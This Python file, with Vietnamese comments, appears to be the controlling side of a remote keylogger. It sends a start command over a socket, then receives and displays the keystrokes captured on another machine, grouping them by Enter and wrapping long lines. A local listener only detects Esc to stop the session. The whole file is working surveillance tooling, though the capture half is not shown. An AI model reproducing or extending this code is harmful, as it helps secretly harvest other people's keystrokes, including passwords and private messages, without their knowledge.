# key_logger.py
from pynput import keyboard

# Biến trạng thái keylogger
keylogger_running = False

# Độ dài dòng tối đa trước khi tự động xuống dòng
MAX_LINE_LENGTH = 50

def key_logger(client_socket):
    print("Connected to the server. Listening for keystrokes... (Press 'Esc' to stop)")
    keys_pressed = ""
    stop_listener = False  # Biến kiểm tra để dừng listener

    def on_press(key):
        nonlocal stop_listener  # Cho phép sửa biến stop_listener trong hàm on_press
        # Dừng keylogger khi 'Esc' được nhấn
        if key == keyboard.Key.esc:
            print("Stopping keylogger...")
            client_socket.sendall("STOP_KEY_LOGGER".encode("utf-8"))  # Gửi lệnh dừng đến server
            stop_listener = True  # Đặt cờ để thoát vòng lặp
            return False  # Dừng listener của client
        else:
            print(f'Key {key} pressed')  # Hiển thị phím nhấn cho debugging

    # Khởi tạo listener để lắng nghe phím nhấn
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        while not stop_listener:
            # Nhận dữ liệu từ server
            data = client_socket.recv(1024)
            decoded_data = data.decode("utf-8")

            # Kiểm tra nếu là lệnh KEYLOGGER_STOPPED từ server
            if decoded_data == "KEYLOGGER_STOPPED":
                print(f"\rKeys pressed: Key.esc")  # Hiển thị phím Key.esc
                print("\nKeylogger stopped by server. Returning to main menu...\n")
                stop_listener = True  # Thoát khỏi vòng lặp
                break  # Kết thúc vòng lặp

            # Nếu không có dữ liệu (kết nối đã đóng), thoát khỏi vòng lặp
            if not data:
                print("No more data received. Exiting...\n")
                stop_listener = True
                break

            # Kiểm tra nếu nhận ký tự Enter từ server
            if decoded_data == ' Key.enter ':
                # Khi nhận phím Enter, in ra các phím đã nhấn và reset
                print(f'\rKeys pressed: {keys_pressed}')  # In ra các phím đã nhấn
                keys_pressed = ""  # Reset sau khi nhấn Enter
                print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
            else:
                keys_pressed += decoded_data  # Thêm ký tự vào chuỗi

                # Nếu dòng quá dài, xuống dòng mà không lặp lại ký tự
                if len(keys_pressed) > MAX_LINE_LENGTH:
                    print(f'\rKeys pressed: {keys_pressed[:MAX_LINE_LENGTH]}')  # In phần đầu của dòng
                    keys_pressed = keys_pressed[MAX_LINE_LENGTH:]  # Lưu phần còn lại để in tiếp
                print(f'\rKeys pressed: {keys_pressed}', end='')  # In ra trên cùng một dòng

    except Exception as e:
        print(f"Error receiving data: {e}")

    # Đảm bảo listener dừng hẳn sau khi thoát vòng lặp
    listener.stop()
    listener.join()  # Đợi listener hoàn tất trước khi quay lại menu

def toggle_key_logger(client_socket):
    global keylogger_running
    if not keylogger_running:
        client_socket.sendall("START_KEY_LOGGER".encode())
        print("Starting keylogger...")
        keylogger_running = True
        key_logger(client_socket)  # Gọi hàm key_logger
    else:
        client_socket.sendall("STOP_KEY_LOGGER".encode())
        print("Stopping keylogger...")
        keylogger_running = False

def main_menu():
    # Hàm hiển thị menu chính
    print("Main Menu")
    # Thêm mã hiển thị menu chính ở đây

# Gọi main_menu() sau khi keylogger dừng
